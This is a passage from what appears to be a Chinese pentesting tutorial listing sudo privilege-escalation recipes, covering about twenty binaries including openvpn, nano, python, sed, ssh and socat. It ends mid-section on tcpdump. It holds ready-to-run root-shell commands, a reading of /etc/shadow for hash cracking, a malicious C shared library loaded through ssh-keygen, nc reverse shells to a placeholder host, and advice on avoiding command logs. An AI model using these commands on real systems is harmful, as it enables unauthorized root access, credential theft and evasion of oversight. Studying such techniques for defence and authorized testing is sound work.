# 则把新的shell的输入、输出和错误输出都重定向到当前的终端设备
```
提权成功！！！,获得提权后，shell交互性不好,需要 python 的`pty.spawn` 提升交互性
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686141212220-0c54e501-2dea-4a23-a0a2-c5207efb0c14.png#averageHue=%231f2231&clientId=uc8e08173-2447-4&from=paste&height=390&id=u6e8f48da&originHeight=488&originWidth=1855&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=602162&status=done&style=none&taskId=u3a2fa5f5-dedc-4bf9-953c-25cebeda023&title=&width=1484)
## 情景五十一 - openvpn
将想要读的文件指定为 **openvpn** 的配置文件，通过报错信息，获得敏感数据。其实 **flag** 也可以读到。思路要触类旁通, 实现**任意文件读取文件**。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686141369992-838a6046-2b5b-4882-8675-2f8ee0df727d.png#averageHue=%23b7baba&clientId=uc8e08173-2447-4&from=paste&height=62&id=ud38700de&originHeight=77&originWidth=473&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=31977&status=done&style=none&taskId=u7f6894c7-0ee7-498d-80c0-9e98760b1e0&title=&width=378.4)
```bash
sudo openvpn --config /etc/shadow
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686141610464-43697db7-bf20-4fd4-8267-950bd880167b.png#averageHue=%23202832&clientId=uc8e08173-2447-4&from=paste&height=115&id=uf4c96aa7&originHeight=144&originWidth=1852&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=174153&status=done&style=none&taskId=u8d167ba5-f088-4b49-93e7-dd95dbdd35a&title=&width=1481.6)
错误信息中暴露了root的SHA-512格式的hash，通过破解，获得 root 密码，实现提权。
## 情景五十二 - nano
**nano** 是很常用的linux编辑器，提权思路需要掌握，其实和 **vi、ed、less、more **等内在逻辑有很大相似性。
**nano**: **GNU nano**是一个**自由和开源的控制台文本编辑器**，基于 **pico **的源代码。比起其他文本编辑器（例如**vi**和**emacs**），nano的界面相对简单，易于学习和使用。虽然功能上不如其他更复杂的编辑器强大，但是它对于基本的文本编辑来说已经足够。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686141936255-b5c63ab9-e49f-415b-9971-79b82e6e6ccc.png#averageHue=%237f8586&clientId=uc8e08173-2447-4&from=paste&height=69&id=u626a2597&originHeight=86&originWidth=605&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=39062&status=done&style=none&taskId=u0fcf3046-6db8-47e0-93bf-2cb242660b0&title=&width=484)
`**sudo nano**` 启动nano，然后**ctrl+r，ctrl+x**获得命令执行命令行。然后输入 **reset; **
**bash 1>&0 2>&0** 重置shell，启动**bash**，输出和错误输出重定向。获得提权后的shell
```bash
sudo nano

ctrl+r，ctrl+x

reset;bash 1>&0 2>&0
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686142309177-9ca60d9e-85d6-4738-97b4-25bcfb85ebfb.png#averageHue=%231b1e28&clientId=uc8e08173-2447-4&from=paste&height=128&id=ue9edc756&originHeight=160&originWidth=658&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=44833&status=done&style=none&taskId=u0c6c3004-9e51-4110-bee8-1c39003eef4&title=&width=526.4)
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686142344181-3bc0fe15-dd25-45dd-a60f-541b946202db.png#averageHue=%23222536&clientId=uc8e08173-2447-4&from=paste&height=284&id=u412e5b95&originHeight=355&originWidth=1693&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=441552&status=done&style=none&taskId=ue2437372-3571-46a6-98db-95a058f5331&title=&width=1354.4)
## 情景五十三 - pico
pico:** pico（Pine Composer）**是 **Pine电子邮件客户端的组成部分**，这是一个简单易用的文本编辑器。**pico**是闭源的，但是由于其流行，已经有了很多开源的替代品，例如前面提到的nano。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686142581158-f33c9794-3268-475e-8f40-15a59f863e15.png#averageHue=%233b3e3a&clientId=uc8e08173-2447-4&from=paste&height=45&id=u08a8ff3d&originHeight=56&originWidth=564&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=19979&status=done&style=none&taskId=u984bf7c9-de96-4534-81ea-38b041601cb&title=&width=451.2)
pico 其实和 nano 是等价的，两者提权步骤一模一样！！！
```bash
sudo pico

ctrl+r，ctrl+x

reset;bash 1>&0 2>&0
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686143728385-90fc927d-fbd9-4939-96d4-c889c05937c1.png#averageHue=%23262939&clientId=uc8e08173-2447-4&from=paste&height=272&id=ue8c5b1b8&originHeight=340&originWidth=1251&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=363445&status=done&style=none&taskId=u2be5eb85-2c49-4b19-8402-74a1283fc12&title=&width=1000.8)

## 情景五十四 - passwd
sudo下的 **passwd** 命令可以修改全部用户的密码，简直等于直接给了 **root** 权限。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686142706640-cd266dbf-64a7-4839-a630-10dbf8f35713.png#averageHue=%234d544d&clientId=uc8e08173-2447-4&from=paste&height=42&id=u39405a1c&originHeight=53&originWidth=471&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=17413&status=done&style=none&taskId=u46d93e29-756c-4bad-884b-506e9df1258&title=&width=376.8)
```bash
sudo passwd root

# 直接更改 root 密码 ，登录即可提权
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686142906522-e718004c-e694-4bdf-b334-962b7d669813.png#averageHue=%23222430&clientId=uc8e08173-2447-4&from=paste&height=260&id=uf4de0012&originHeight=325&originWidth=640&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=182362&status=done&style=none&taskId=u6bba6359-aa87-415c-b73f-17e97ad1d5e&title=&width=512)
## 情景五十五 - perl
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686142600348-4999594b-41a7-4a72-9d5f-cd843a3776d1.png#averageHue=%234c5558&clientId=uc8e08173-2447-4&from=paste&height=58&id=y5n5B&originHeight=95&originWidth=574&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=42906&status=done&style=none&taskId=ud0d2ba70-0006-485b-92a9-52e04926fd7&title=&width=353)
```bash
sudo perl -e "exec '/bin/bash';"

# -e ：这是 Perl 的命令行选项，允许我们直接在命令行中执行 Perl 脚本。在这里，
# 它运行了后面跟随的 Perl 代码。

# perl 代码中 exec 函数用于启动一个子进程来执行指定的程序。
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686143175665-cddb37f7-1eef-40cb-b44a-14b7df634886.png#averageHue=%23242733&clientId=uc8e08173-2447-4&from=paste&height=174&id=u45e29bca&originHeight=218&originWidth=801&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=158989&status=done&style=none&taskId=u0909bf90-ff08-4486-8144-bf6c61d724e&title=&width=640.8)
## 情景五十六 - python
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686142717449-4952bc12-f27d-427d-8a67-124f5a5a2f9c.png#averageHue=%23272935&clientId=uc8e08173-2447-4&from=paste&height=23&id=uc163fc83&originHeight=29&originWidth=514&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15604&status=done&style=none&taskId=uac235eb7-80d7-44a6-88e7-fc7c35c16c0&title=&width=411.2)
python 语言提权的语句非常多
```bash
sudo python3 -c "import os;os.system('/bin/bash')"

sudo python3 -c "import pty;pty.spawn('/bin/bash')" 
# 这种提升交互性的语句，也能用来提权

sudo python3 -c "import os;os.execl('/bin/bash','bash','-c','reset; exec bash')"
#  获得了经过 reset 重置的 bash 环境


# os.execl() 函数，它在指定的路径上执行一个新的程序。在这里，我们
# 指定执行 /bin/bash ，也就是 Bash Shell。通过传递额外的参数 "bash",
# "-c", "reset; exec bash" 给 execl() 函数，我们要求 Bash 执行两个操
# 作：

# reset : 这个命令用于清空当前终端窗口的显示，并重置终端的设置。
# exec bash : 这个命令要求 Bash 在当前终端中启动一个新的交互式
# Shell 会话。这样，当你输入 exit 命令退出新的 Shell 会话时，会立
# 即返回到原来的终端。
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686144526736-d5917e94-fd69-4577-a2fd-73f031779af0.png#averageHue=%23222431&clientId=uc8e08173-2447-4&from=paste&height=127&id=u2b2430ba&originHeight=159&originWidth=971&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=133524&status=done&style=none&taskId=u0f96b766-0d28-4dbb-be02-5d619948d02&title=&width=776.8)
## 情景五十七 - pkexec
**pkexec ：**这是** PolicyKit **的一部分，**PolicyKit** 是一种服务，**用于管理系统范围内的策略，并允许非特权进程通信以进行特权操作。 pkexec **允许一个授权用户执行程序（我们用它来启动 `**/bin/bash**` ）作为另一个用户，并且可以在没有密码提示的情况下运行。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686143856377-cf5fb649-c8f7-43e8-9036-020d74e7b2b5.png#averageHue=%23232531&clientId=uc8e08173-2447-4&from=paste&height=32&id=u7bc8e525&originHeight=40&originWidth=466&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=16368&status=done&style=none&taskId=u783d5447-4cbe-488c-98c1-4298db2a8ee&title=&width=372.8)
```bash
sudo pkexec /bin/bash
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686143942228-e566bfab-d41d-4c78-8acb-46ff62182d48.png#averageHue=%23222430&clientId=uc8e08173-2447-4&from=paste&height=138&id=ueab6bd73&originHeight=173&originWidth=628&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=91663&status=done&style=none&taskId=u7531ff87-d795-4be4-a55a-792cf2ca09f&title=&width=502.4)
## 情景五十八 - rvim
**rvim **：这是** Vim** 编辑器的一个特殊版本，**其中的"r"代表"restricted"（限制的）**。相比于普通的Vim，**rvim** 限制了一些命令，防止执行可能会对系统有害的操作。比如，rvim不允许使用shell命令或者脚本。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686228226537-fe7a3c7c-fbe9-47dc-b219-9fd76114b52c.png#averageHue=%23272834&clientId=uc980f6a7-c3c1-4&from=paste&height=45&id=ua17bbd5f&originHeight=56&originWidth=446&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=22015&status=done&style=none&taskId=ue7ccaa9c-fbf2-4432-86ba-d5948311fd6&title=&width=356.8)
```bash
sudo rvim -c ':!/bin/bash' /dev/null # 提权失效
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686145303622-41762227-5780-4d8e-bb38-194ed30a2222.png#averageHue=%23292b36&clientId=uc8e08173-2447-4&from=paste&height=22&id=u57a956e2&originHeight=27&originWidth=408&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=12610&status=done&style=none&taskId=ueeb7eeb2-92a5-4b6d-9201-e609c57957b&title=&width=326.4)
```bash
sudo rvim -c ":python import os;os.execl('/bin/bash','bash','-c','reset; exec bash')"

# :是 vim 的命令行前缀。 后面执行 python 脚本
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686190563392-8bbc5f34-cfd7-49cf-92d1-e5b508d2bc19.png#averageHue=%23222430&clientId=u1a40d7cf-7fee-4&from=paste&height=229&id=uf46a0802&originHeight=286&originWidth=805&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=191786&status=done&style=none&taskId=u73101a1e-7f73-4c92-b049-badcecd479b&title=&width=644)
## 情景五十九 - scp
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686145320372-2f0f93af-04dd-41c5-bc47-91fc2c415e38.png#averageHue=%23232531&clientId=uc8e08173-2447-4&from=paste&height=31&id=u2d25f441&originHeight=39&originWidth=397&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=14870&status=done&style=none&taskId=u37de56d1-076e-4eb1-8651-7c3f6707b11&title=&width=317.6)
scp 是**secure copy(安全复制)**的缩写，用于在Linux下进行**远程文件复制**，它的功能类似于 cp 命令，不过 cp 是在本机进行复制不能跨服务器，而 scp 就可以跨服务器，是利用SSH进行安全的远程文件复制。
```bash
SCP_SHELL=$(mktemp)

echo 'bash 0<&2 1<&2' > $SCP_SHELL
#  0<&2 1<&2 : 它使用文件描述符重定向将标准输出和标准输入都重定向到标准错误输出。

chmod +x $SCP_SHELL # 给予该文件可执行

sudo scp -S $SCP_SHELL x y:

# -S  这一部分指定了ssh的程序
# x 和 y: 这部分是 scp 命令的参数，表示源文件（x）和目标位置（y:）
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686147242326-75c286e5-dc4b-4724-b725-a2367e6433b8.png#averageHue=%2320232f&clientId=uc8e08173-2447-4&from=paste&height=194&id=u672bb507&originHeight=243&originWidth=779&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=141335&status=done&style=none&taskId=uf49efac2-4796-4239-b394-96bf2267dd0&title=&width=623.2)
## 情景六十 - screen
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686197584719-7257edba-2066-483c-bc33-d1ed71eb67b0.png#averageHue=%23a1a1a6&clientId=u0ee536f4-2de2-4&from=paste&height=34&id=u58eeb060&originHeight=42&originWidth=440&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=8066&status=done&style=none&taskId=uc039e216-8fe2-4bcc-bd39-68c0248ba77&title=&width=352)
本身就是**终端复⽤⼯具**，所以⾮常容易起新的终端。**tmux**与此相同的⽤法也可以提权。
```bash
sudo screen  # 直接生成一个 root 的 终端得以提权
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686197836787-d5d88889-7ba2-4f58-a8bd-a77f009e2e6d.png#averageHue=%23252834&clientId=u0ee536f4-2de2-4&from=paste&height=567&id=uc0d5030e&originHeight=709&originWidth=819&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=512770&status=done&style=none&taskId=u5f55fb0c-cf3f-48a4-8750-9bce4728fa8&title=&width=655.2)
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686197792604-f71857fe-aa0c-4fef-a4c6-4311517f6358.png#averageHue=%23232530&clientId=u0ee536f4-2de2-4&from=paste&height=140&id=ua70afe0a&originHeight=175&originWidth=585&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=92266&status=done&style=none&taskId=ufb4aaa4e-35fe-4748-8a45-d0b998f8501&title=&width=468)
## 情景六十一 - script
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686199087944-fc4cf182-7f94-440c-8e45-df0694336e7c.png#averageHue=%23252733&clientId=u0ee536f4-2de2-4&from=paste&height=38&id=ua3d4af1d&originHeight=47&originWidth=433&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=19216&status=done&style=none&taskId=u9e8d7eb4-671c-439f-a3e3-7b72f863309&title=&width=346.4)
**script **本来就是启动新的 **shell **会话，然后记录 **shell** 所有命令记录。单纯从提权⻆度`**sudo script**` 就够了。但作为渗透测试，当然不希望留下提权后的命令记录。
所以 -q 和 /dev/null参数极为重要。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686198999395-e98a9e4f-21a7-4d52-b8b7-693fdc1205a2.png#averageHue=%23252734&clientId=u0ee536f4-2de2-4&from=paste&height=642&id=uaba48606&originHeight=803&originWidth=756&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=529692&status=done&style=none&taskId=u67e417a8-6451-40a6-ac10-93722105f38&title=&width=604.8)
执行 `**sudo script**`** **提权后，留下 **typescript **shell 记录文件。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686199693748-dbf7eeb0-aee2-4dac-9e45-d2b339cd381d.png#averageHue=%23272a38&clientId=u0ee536f4-2de2-4&from=paste&height=330&id=u80132ccf&originHeight=413&originWidth=993&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=363317&status=done&style=none&taskId=ube1a0138-72c7-4303-ade4-523c842b3b6&title=&width=794.4)
```bash
sudo script -q /dev/null

# /dev/null 丢弃 shell 记录的消息
# -q quiet 静默模式：不显示记录开始和结束消息
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686199526380-af2bf1d1-7f7f-4243-b86e-7ef8526871bb.png#averageHue=%23222430&clientId=u0ee536f4-2de2-4&from=paste&height=166&id=u6ed8ea18&originHeight=207&originWidth=695&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=123657&status=done&style=none&taskId=u2fc06ca3-a1a8-4b08-aeb3-8f0bfb21c0e&title=&width=556)
## 情景六十二 - sed
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686200283115-6be244f7-4d90-4d0d-80e9-3a74fdbbd6ee.png#averageHue=%23a3a4a8&clientId=u1b909568-6d31-4&from=paste&height=34&id=u1081abda&originHeight=42&originWidth=391&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=7743&status=done&style=none&taskId=u23fe4d1b-4f53-44ea-978d-69726cf4fd3&title=&width=312.8)
**sed** 是⼀个强⼤的⽂本处理⼯具，⽤于对⽂本⽂件进⾏读取、处理和编辑。 
```bash
sudo sed -n '1e exec bash 1>&0 2>&0' /etc/passwd

# -n 是 sed 的⼀个选项，⽤于不⾃动打印（silent模式）。
# sed 默认会打印每⼀⾏，使⽤ -n 选项后，sed 只会打印你告诉它打印的⾏。

# '1e exec bash 1>&0' ：这是 sed 的命令部分。 
# 1e 告诉 sed 在处理到第⼀⾏后执⾏ e 命令。 
#e 命令让 sed 执⾏后⾯的命令，并把执⾏结果插⼊到原⽂本流中。
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686201781851-9f9d16e0-b021-463e-95dc-2edbb800e028.png#averageHue=%23212433&clientId=uabd7def7-bcc3-4&from=paste&height=206&id=ue71b7ea3&originHeight=258&originWidth=1464&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=287797&status=done&style=none&taskId=u11da818b-9386-4784-be91-783af875580&title=&width=1171.2)
## 情景六十三 - service
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686202228127-2313634b-ffe5-4b11-8923-44b46656d6a3.png#averageHue=%23464945&clientId=uabd7def7-bcc3-4&from=paste&height=36&id=u4eda2b43&originHeight=45&originWidth=470&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=11662&status=done&style=none&taskId=ubff9775c-b971-4bf6-81b5-7ddddf84f69&title=&width=376)
尝试将bash作为服务启动
```bash
sudo service ../../bin/bash

# ../../是在服务的路径搜索中（$PATH中的）⽗⽗级路径应该就能搜到bash。
# linux 服务路径 是 $PATH 的 父父路径下找
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686202372023-859b5b2d-96d7-4876-980c-007254119e9f.png#averageHue=%23212430&clientId=uabd7def7-bcc3-4&from=paste&height=297&id=ufec536e2&originHeight=371&originWidth=662&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=214048&status=done&style=none&taskId=ue57444ff-413d-4ac4-acf0-34da64eb54b&title=&width=529.6)
## 情景六十四 - socat
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686202983673-5c54fe9a-e8aa-40d6-9d90-e9963da13a3b.png#averageHue=%23767776&clientId=uabd7def7-bcc3-4&from=paste&height=42&id=uf07300c1&originHeight=52&originWidth=428&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=14786&status=done&style=none&taskId=u78f1bbb5-3f89-4e0e-a2c8-73f6eb52f97&title=&width=342.4)
**socat** : **socat** 是**多功能的⽹络⼯具**，它可以**建⽴双向的数据传输通道**。在这个命令中，**socat** ⽤来创建⼀个通道，从**标准输⼊ (stdin) 到执⾏ /bin/bash**。
```bash
sudo socat stdin exec:/bin/bash

# stdin : stdin 是标准输⼊。这通常指的是从键盘输⼊到程序的数据。

# exec:/bin/bash : 这是 socat 命令的第⼆个参数。
#  exec: 让 socat 执⾏⼀个给定的命
# 令， /bin/bash 就是被执⾏的命令。/bin/bash 是⼀个 shell，它⽤来接收⽤户输⼊的命令，并将它们
# 传递给操作系统来执⾏。
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686204078952-c8b72f69-a66c-4486-aa91-9782f66c13a6.png#averageHue=%23222532&clientId=u3b6a52c4-de58-4&from=paste&height=425&id=u223f12a5&originHeight=531&originWidth=1042&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=406718&status=done&style=none&taskId=u8052c51f-0be9-4196-8144-5fac3c28fd8&title=&width=833.6)
## 情景六十五 - ssh -  版本 < SSH-2.0-OpenSSH_9.2p1
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686204134944-e57362cb-62dc-4419-8952-94a48b701ef6.png#averageHue=%23808281&clientId=u3b6a52c4-de58-4&from=paste&height=41&id=u26bdc825&originHeight=51&originWidth=415&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=14059&status=done&style=none&taskId=u2aca5dea-0863-4cdc-a2c0-2477866c367&title=&width=332)
```bash
sudo ssh -o ProxyCommand=';bash 0<&2 1<&2' x

# -o ProxyCommand 是 SSH 的⼀个选项，在典型的情况下，
# ProxyCommand ⽤于通过⼀个代理服务器连 接到远程主机
# x 是任意字符串，保证 ssh 命令的完整性。

sudo ssh -o ProxyCommand='bash' x  # 报错会显示 OpenSSH 版本号
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686206626206-3cd174fa-9949-4367-bca5-31b34ba5411a.png#averageHue=%23212430&clientId=u3b6a52c4-de58-4&from=paste&height=60&id=u37c14d2c&originHeight=75&originWidth=622&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=36715&status=done&style=none&taskId=ud2b4672a-2627-46ac-a39d-9cf86f8b2d0&title=&width=497.6)
注意 ：关于**bash**前的分号： 
    当你的** ProxyCommand** 是 `**bash 0<&2 1>&2**` ， **ssh** 试图使⽤这个 bash 实例作为其通道。然⽽，这个 bash 实例的 **stdin/stdout** 已经被重定向到 **stderr**，这就是为什么** ssh** ⽆法通过这个 bash 实例连接到⽬标主机的原因。结果就是 ssh 在尝试进⾏密钥交换时⽆法与远程主机通信，导致了错误。 
     当你在 **ProxyCommand** 中加⼊⼀个分号 `**;**`时，**你实际上是在执⾏⼀个空命令**，然后再执⾏ `**bash 0<&2 1>&2**` 。在这种情况下，** ssh** 会连接到这个空命令的 **stdin/stdout**。因为这个空命令没有重定向其 **stdin/stdout**，所以 **ssh** 能够正常地通过这个空命令连接到⽬标主机。
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686205430453-d17a90a3-123c-40d2-95ae-d7e2b5974e3f.png#averageHue=%23222435&clientId=u3b6a52c4-de58-4&from=paste&height=220&id=u696e9d60&originHeight=275&originWidth=1491&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=301385&status=done&style=none&taskId=u30a62c81-4040-410e-810a-7a7fed23398&title=&width=1192.8)
## 情景六十六 - ssh-keygen - 自定义共享库提权
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686207269079-0d21a7b5-1a22-4d51-b3c7-80cada9f44f7.png#averageHue=%23bebfc1&clientId=u3b6a52c4-de58-4&from=paste&height=29&id=u1ad5f661&originHeight=36&originWidth=489&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=7892&status=done&style=none&taskId=u8d85af66-3061-4689-a753-8f673822562&title=&width=391.2)
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void inject() __attribute__((constructor));

void inject() {

    setuid(0);
    setgid(0);

    system("/bin/bash -p");
}
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686208786875-c0e89b9c-45cd-4577-8616-73867e18da1a.png#averageHue=%2320222f&clientId=u3b6a52c4-de58-4&from=paste&height=390&id=u95cad36b&originHeight=487&originWidth=673&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=221469&status=done&style=none&taskId=u4f87a9a6-7357-4c58-8a42-02ce38a3acb&title=&width=538.4)
```bash
gcc -shared -fPIC shell.c -o shell.so
```
```bash
sudo ssh-keygen -D ./shell.so

# -D ：这是 ssh-keygen ⼯具的⼀个选项。
# 在这种情况下， -D 选项⽤于指定⼀个动态链接库⽂件，该
# ⽂件将被 ssh-keygen 加载和使⽤。 (也是提权利用的点)
```
注意：库⽂件搜索路径可以在**系统环境变量** **LD_LIBRARY_PATH** 中指定。 **LD_LIBRARY_PATH** 是⼀个⽤于指定动态链接库搜索路径的环境变量。当程序需要加载共享库⽂件时，系统会在 **LD_LIBRARY_PATH** 中指定的路径下搜索库⽂件。如果库⽂件不在指定的路径中，系统会报错并⽆法加载该库。默认情况下，系统会预定义⼀些标准的库⽂件搜索路径，如 **/lib 、 /usr/lib** 等。
     在上述代码中，未提供完整的⽂件路径时， **ssh-keygen** 命令会在默认的库⽂件搜索路径中查找指定的 **lib.so** ⽂件，⽽指定了 **./lib.so** 时，系统会在当前⽬录下查找该⽂件。
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686208762672-0c5e5c9d-a365-489e-9b57-ef793d3ca2f5.png#averageHue=%23232532&clientId=u3b6a52c4-de58-4&from=paste&height=206&id=u29d93084&originHeight=257&originWidth=881&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=188974&status=done&style=none&taskId=u44dcb836-c3c1-4172-8a94-d3f999d60dc&title=&width=704.8)
## 情景六十七 - strace
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686207310120-2fa0e5cb-77e0-489d-9a15-22633e23bdd1.png#averageHue=%239fa0a5&clientId=u3b6a52c4-de58-4&from=paste&height=35&id=u9514e886&originHeight=44&originWidth=428&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=9027&status=done&style=none&taskId=u288dd43d-f1e2-44c9-b025-cb743bb8423&title=&width=342.4)
strace : 这是⼀个Linux 命令，**它的功能是追踪和记录另⼀个进程的系统调⽤和接收到的信号。**这对于调试和理解程序的运⾏⽅式⾮常有⽤。
```bash
sudo strace -o /dev/null /bin/bash

# -o /dev/null : 这是⼀个将 strace 的输出重定向到 /dev/null 的参数。 
# /dev/null 是⼀个特殊的⽂件，它会丢弃所有写⼊到它的数据。
# 也就是说，这条命令会追踪 /bin/bash 的系统调⽤，但是并不会保存
# 或者显示这些信息，因为这些信息被写⼊了 /dev/null 。
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686209560806-0ed74198-5c17-47d0-919e-d140c06ad679.png#averageHue=%23242632&clientId=u3b6a52c4-de58-4&from=paste&height=207&id=u6e3154e3&originHeight=259&originWidth=802&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=174899&status=done&style=none&taskId=u7edfb762-8e2c-46d7-af1f-0d9fbe8a344&title=&width=641.6)
## 情景六十八 - systemctl
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686207342671-9dd81790-6417-4f3d-9933-80d058f52134.png#averageHue=%23a0a1a5&clientId=u3b6a52c4-de58-4&from=paste&height=34&id=uc3b404e9&originHeight=42&originWidth=487&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=10109&status=done&style=none&taskId=u49d31be9-f0d1-444c-85a6-ef6bb030009&title=&width=389.6)
systemctl ：这是 **Systemd** 的主要命令⾏⼯具。**Systemd是现代许多Linux发⾏版的初始化系统，负责引导系统并管理系统运⾏级别。**systemctl**允许你启动，重启，停⽌，禁⽤，启⽤系统服务**，查看系统状态,查看和控制系统⽇志，等等。
```bash
sudo systemctl  # 进入 less 界面

!/bin/bash
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686210519028-00457695-da86-468a-8664-863a0ade26f1.png#averageHue=%231f212e&clientId=u3b6a52c4-de58-4&from=paste&height=222&id=u1d76d85b&originHeight=277&originWidth=542&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=115313&status=done&style=none&taskId=u58fe88dd-f3c8-4dd0-8143-1e2603174cc&title=&width=433.6)
## 情景六十九 - tcpdump - 难点
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686210683776-08205504-d73e-4b3c-87c1-999114d03bf4.png#averageHue=%232e3241&clientId=u3b6a52c4-de58-4&from=paste&height=26&id=u62e63a06&originHeight=32&originWidth=444&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=18841&status=done&style=none&taskId=u8e0be758-6ed0-42f5-9692-30b11c5d2bf&title=&width=355.2)
```bash
mknod GTC_pipe p && /bin/nc x.x.x.x xxxx  0<GTC_pipe |
/bin/bash  1>GTC_pipe

# 使⽤ mknod 命令创建命名管道（named pipe）
# ⽬的是为了在⽂件系统中创建⼀个特殊类型的⽂件，⽤于进程间通信。

# 虽然在Linux系统中也可以使⽤ mkfifo 命令创建命名管道，
# 但是 mknod 命令提供了更灵活的选项，可以创建其他类型的特殊⽂件，如设备⽂件
```
在给定的命令序列中，使⽤ **mknod **命令创建命名管道的**⽬的是为了实现输⼊和输出的重定向。**命名管道允许将输出从⼀个进程传递给另⼀个进程，使得数据流可以通过管道进⾏传输。通过使⽤命名管道，可以实现将 nc 命令的输出作为输⼊传递给 **/bin/bash** 命令，并将 **/bin/bash** 命令的输出发送回命名管道。
或
```bash
rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f | bash -i 2>&1 | nc x.x.x.x xxxx > /tmp/f

# 这个生成 shell 不稳定

mkfifo GTC_pipe  && /bin/nc x.x.x.x xxxx  0<GTC_pipe |
/bin/bash  1>GTC_pipe
# 这个可以
```
```bash
chmod +x shell.sh  # 记得将 shell.sh 更新


sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z ./shell.sh -Z root

